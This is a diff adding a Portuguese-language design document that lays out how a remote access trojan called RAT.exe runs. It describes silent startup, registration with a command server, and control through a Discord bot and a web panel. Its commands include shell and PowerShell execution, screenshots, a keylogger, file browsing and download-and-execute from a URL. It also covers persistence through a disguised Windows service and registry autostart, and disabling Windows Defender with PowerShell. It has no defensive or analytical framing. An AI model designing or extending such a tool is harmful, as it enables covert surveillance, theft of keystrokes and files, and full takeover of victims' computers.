@@ -1,0 +1,197 @@
+╔════════════════════════════════════════════════════════════════════════════════╗
+║                    FLUXO DO RAT.EXE AO SER EXECUTADO                          ║
+╚════════════════════════════════════════════════════════════════════════════════╝
+
+1️⃣ INICIALIZAÇÃO (0-10 segundos)
+═════════════════════════════════
+   └─ RAT.exe iniciado
+      └─ Sem console visível (silencioso)
+      └─ main() chamado
+         ├─ sleep(8) → aguarda 8 segundos
+         ├─ load_admin_status() → verifica privilégios de admin
+         └─ check_single_instance() → garante uma única instância
+
+
+2️⃣ REGISTRO NO SERVIDOR CENTRAL (5-15 segundos)
+═════════════════════════════════════════════
+   └─ central_client = CentralClient(url, pc_name)
+      └─ URL padrão: http://localhost:5000
+      └─ PC_NAME: Nome da máquina (ex: DESKTOP-R9GCA2I)
+      
+      └─ central_client.register()
+         ├─ POST /api/register
+         │  └─ Envia: {"pc_name": "...", "system_info": {...}}
+         └─ Se sucesso → inicia heartbeat thread
+            └─ Heartbeat a cada 5 segundos
+
+
+3️⃣ CONEXÃO AO DISCORD (10-20 segundos)
+════════════════════════════════════
+   └─ bot.run(TOKEN)
+      ├─ Conecta ao servidor Discord
+      ├─ Autentica com bot token
+      └─ Aguarda @bot.event on_ready()
+
+
+4️⃣ BOT PRONTO - on_ready() executado
+════════════════════════════════════
+   └─ Bot conectado ao Discord
+      ├─ Cria/procura guild (servidor) por ID
+      ├─ Cria canal #control (ou usa existente)
+      ├─ Aguarda comandos Discord
+      └─ Inicia task: send_messages()
+
+
+5️⃣ BACKGROUND THREADS (contínuo)
+═════════════════════════════════
+
+   THREAD 1: HEARTBEAT (a cada 5 segundos)
+   ─────────────────────────────────────
+   └─ Envia POST /api/heartbeat
+      ├─ Atualiza last_heartbeat no servidor
+      ├─ Atualiza status para ONLINE
+      └─ Busca commands na fila
+
+
+   THREAD 2: CLEANUP_ZOMBIE_PCS (Docker, a cada 10s)
+   ─────────────────────────────────────────────────
+   └─ No servidor Docker (web_api_docker.py)
+      └─ PCs offline > 30s → marca como OFFLINE
+
+
+   THREAD 3: SEND_MESSAGES (contínuo)
+   ──────────────────────────────────
+   └─ Verifica fila de mensagens para Discord
+      └─ Envia resultados de comandos
+
+
+6️⃣ PAINEL WEB LISTA O PC (em tempo real)
+════════════════════════════════════════
+   └─ http://localhost:5000
+      ├─ GET /api/pcs
+      │  └─ Retorna lista de PCs conectados
+      ├─ Stats mostrados:
+      │  ├─ 1 REGISTERED
+      │  ├─ 1 ONLINE
+      │  ├─ CPU usage servidor
+      │  └─ RAM usage servidor
+      └─ PC aparece na lista (clicável)
+
+
+7️⃣ PRONTO PARA RECEBER COMANDOS
+════════════════════════════════
+   
+   Opção A: VIA DISCORD
+   ──────────────────
+   └─ !cmd whoami
+   └─ !screenshot
+   └─ !powershell Get-ChildItem
+   └─ !execute https://url.com/file.exe
+   └─ !keylog start/stop/logs
+   
+   
+   Opção B: VIA PAINEL WEB
+   ──────────────────────
+   └─ Clica no PC na lista
+   └─ Execute Command → envia via /api/command
+   └─ Screenshot → envia para Discord webhook
+   └─ Execute URL → baixa e executa
+   └─ Keylogger → start/stop/logs
+   └─ File Manager → lista/download arquivos
+
+
+8️⃣ CICLO DE RECEPÇÃO DE COMANDOS
+═════════════════════════════════
+
+   loop contínuo:
+   ──────────────
+   1. central_client._heartbeat_loop() 
+      ├─ POST /api/heartbeat
+      ├─ Recebe "commands": [...]
+      └─ Para cada comando:
+         └─ _execute_command(cmd)
+            ├─ Tipo: "cmd" → subprocess.run()
+            ├─ Tipo: "powershell" → powershell -Command
+            ├─ Tipo: "screenshot" → captura tela
+            ├─ Tipo: "execute" → wget + execute
+            ├─ Tipo: "keylogger_start" → inicia listener
+            └─ Tipo: "files_list" → lista diretório
+   
+   2. Discord commands (!cmd, !screenshot, etc)
+      ├─ Recebe comando do usuário autorizado
+      ├─ Executa localmente
+      ├─ Retorna resultado via embed
+      └─ Se screenshot → envia arquivo
+
+
+9️⃣ PERSISTÊNCIA & STEALTH
+════════════════════════════
+
+   Ao iniciar:
+   ──────────
+   ✓ Sem console visível
+   ✓ Sem mensagens de erro mostradas
+   ✓ Sem logs exibidos
+   ✓ Roda como serviço Windows (HealthChecker)
+   ✓ Autostart no registro Windows
+   ✓ Protegido do Windows Defender
+   └─ 11 comandos PowerShell desativam Defender
+   └─ Múltiplas exclusões de pastas
+   └─ Para serviço WinDefend
+   
+   
+🔟 ESTRUTURA DE DADOS
+═════════════════════
+
+   NO SERVIDOR DOCKER:
+   ──────────────────
+   connected_pcs = {
+       "DESKTOP-R9GCA2I": {
+           "status": "ONLINE",
+           "last_heartbeat": 1704120899.123,
+           "registered_at": "2025-12-29 03:01:39.123456"
+       },
+       "TEST-PC-001": {
+           "status": "ONLINE",
+           "last_heartbeat": 1704120898.456,
+           "registered_at": "2025-12-29 03:01:40.456789"
+       }
+   }
+
+
+═════════════════════════════════════════════════════════════════════════════════
+RESUMO DO TIMELINE:
+═════════════════════════════════════════════════════════════════════════════════
+
+T=0s    : RAT.exe executado (silencioso)
+T=8s    : Aguarda (sleep)
+T=8.5s  : Tenta conectar ao servidor central
+T=10s   : Se servidor OK → registra PC
+T=12s   : Inicia heartbeat thread
+T=15s   : Inicia conexão Discord
+T=20s   : Bot pronto, aguarda comandos
+T=20+   : PC aparece no painel web
+T=25s   : Primeira vez heartbeat retorna
+T=∞     : Aguarda e executa comandos
+
+═════════════════════════════════════════════════════════════════════════════════
+FLUXOS PARALELOS (threads):
+
+┌─ Main Thread
+│  └─ Discord Bot eventos
+│     └─ on_ready() → cria canais
+│     └─ Processa comandos (!cmd, !screenshot, etc)
+│
+├─ Heartbeat Thread (central_client)
+│  └─ A cada 5s: POST /api/heartbeat
+│     └─ Recebe e executa commands
+│
+├─ Send Messages Thread (Discord)
+│  └─ Envia resultados para Discord
+│
+└─ Windows Defender Bypass (1x ao iniciar)
+   └─ 11 comandos PowerShell
+   └─ Exclusões no registro
+   └─ Para serviço WinDefend
+   
+═════════════════════════════════════════════════════════════════════════════════
